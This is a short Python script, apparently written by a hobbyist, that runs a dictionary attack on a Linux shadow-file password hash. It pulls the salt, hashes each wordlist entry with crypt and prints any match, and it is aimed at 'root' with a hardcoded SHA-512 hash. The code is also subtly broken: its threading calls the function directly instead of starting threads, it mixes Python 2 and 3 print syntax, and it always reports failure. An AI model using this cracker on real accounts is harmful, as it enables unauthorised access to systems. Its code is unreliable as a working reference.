#!/usr/bin/env python
#-*- coding: utf-8 -*-
"""
Created on 2017/01/20
@author: Chao Zhou
@group : Spider
@contact: 1161192890@qq.com
"""

import re,threading,platform
class hackLinuxPW():

    def __init__(self,dictFile,user,pwd):
        self.sysstr = platform.system()
        if (self.sysstr == "Linux"):
            self.user = user
            self.dictFile = dictFile
            self.pwd = pwd
            self.salt = re.search('\$(\w+)\$(\w+)\$', pwd).group()
            # self.BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            # self.data_dir = os.path.join(self.BASE_DIR,'data')
            self.testPass(self.pwd)
        else:
            print ("please run this script on linux system!")


    def comparePass(self,pw):
        import crypt
        cryptWord = crypt.crypt(pw, self.salt)
        if (cryptWord == self.pwd):
            print '[+] Found Password: ' + pw + '\n'
        print 'compare once!'



    def testPass(self,pw):
        with open(self.dictFile) as f:
            for line in f:
                line = line.strip('\n')
                t = threading.Thread(target=self.comparePass(line))
                t.start()


        print "[-]Password not found.\n"







if __name__ == '__main__':
    hackLinuxPW(r'/tmp/mima','root','$6$HqfT0spQ$S4I6WjbP0DCg3OrtSqUuBTWIGA7/BsVg1G9svm2sEHE/bdO03lOqk/6O4J0BFCi5.vLgDnVZBiFchzUdZojQt/')